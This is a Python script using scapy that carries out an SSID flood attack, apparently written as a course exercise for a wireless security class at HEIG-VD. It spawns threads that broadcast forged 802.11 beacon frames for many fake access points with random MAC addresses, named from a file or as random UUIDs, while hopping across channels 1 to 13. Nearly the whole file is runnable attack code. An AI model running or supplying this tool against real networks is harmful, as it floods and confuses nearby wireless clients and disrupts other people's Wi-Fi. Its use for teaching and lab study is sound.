#!/usr/bin/python3
from scapy.all import *
import argparse
import io, random, uuid
import threading
import time
import sys, signal # for stopping the script src: handle ctrl+c in python

# sources: - https://www.geeksforgeeks.org/how-to-create-fake-access-points-using-scapy-in-python/

threads = [] # contains all running threads
stop_signal = False

### Non important code here... the attack is done in main() and the class fakeAPThread


# To exit the script properly we need to end the threads 
def signal_handler(signal, frame):
    print("\n\tStopping the APs...")
    stop_signal = True
    for t in threads:
        t.stop.set()
    
    # wait for threads to finish
    for t in threads:
        t.join()

def random_mac():
    chars = random.randint(0,2**48) # 6 bytes
    chars = '%012x' % chars # convert in 12 hex chars without '0x'
    mac = ""
    for i in range(len(chars)): # split in groups of 2 chars separated by ':'
        mac += chars[i]
        if i % 2 and i < len(chars) - 1:
            mac +=":"
    return mac

def random_ssids(n: int):
    if n < 1:
        print("Error: Argument should be >= 1\n")
        raise argparse.ArgumentError()			        

    uuids = []
    for i in range(n):
        uuids.append(str(uuid.uuid4()))
    return uuids
    
# Function for checking type of argument
def file_or_n(s):
    if s.isnumeric():
        return random_ssids(int(s))

    # try to read the file
    with open(s, "r") as file:
        return [line.rstrip() for line in file] # returns an array with each line without trailing chars (\n, \r, ...)

class ChannelChanger(threading.Thread):
	def __init__(self, interface, interval=0.5):
		threading.Thread.__init__(self)
		self.interface = interface
		self.interval = interval
		self.stop = threading.Event()
		
	def run(self):
		ch = 1
		while not self.stop.is_set():
		    os.system(f"iwconfig {self.interface} channel {ch}")
		    ch = ch % 13 + 1
		    time.sleep(self.interval)
		print("Stopped changing channel")

### End of uninteresting functions


class FakeAPThread(threading.Thread):
    def __init__(self, ssid, interface, interval=0.1):
        threading.Thread.__init__(self)
        self.stop = threading.Event()
        self.ssid = ssid
        self.mac = random_mac()
        self.iface = interface
        self.interval = interval
    
    # This is the code running the fake AP
    def run(self):
        # Stack the layers
        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=self.mac, addr3=self.mac)
        beacon = Dot11Beacon()
        essid = Dot11Elt(ID="SSID", info=self.ssid, len=len(self.ssid))
        frame = RadioTap()/dot11/beacon/essid
        
        # Send the beacons
        print("\t", self.ssid, " with MAC address ", self.mac, sep="", flush=True)
        while not self.stop.is_set():
            time.sleep(self.interval)
            sendp(frame, iface=self.iface, verbose=0)   # WARNING LOOP
        print("\t", self.ssid, " stopped", sep="")


def main(args):


	# init channel changer
	channel_changer = ChannelChanger(args.interface)
	channel_changer.start()
	threads.append(channel_changer)
    #channel_changer = Thread(target=change_channel, args=(args.interface,))
    #channel_changer.daemon = True
    	
	print("Started APs:")
	for ssid in args.list_or_count:
		try:
			thread = FakeAPThread(ssid, args.interface)
			thread.start()
			threads.append(thread)
		except:
			print("Error: couldn't create", ssid)
    
	print("\nPress Ctrl+C to stop the script.")
	signal.signal(signal.SIGINT, signal_handler)


if __name__ == "__main__":
    # check admin privileges
    if not os.getuid() == 0:
        print("Permission denied. Try running this script with sudo.")
        exit()    
    
    # just parsing arguments
    parser = argparse.ArgumentParser(
        description="Performs a SSID flood attack",
        epilog="This script was developped as an exercise for the SWI course at HEIG-VD")
        
    parser.add_argument("list_or_count", type=file_or_n, help="File with SSID list or N random")
    parser.add_argument("interface", help="Interface to use to create fake APs")

    args = parser.parse_args()
    main(args)
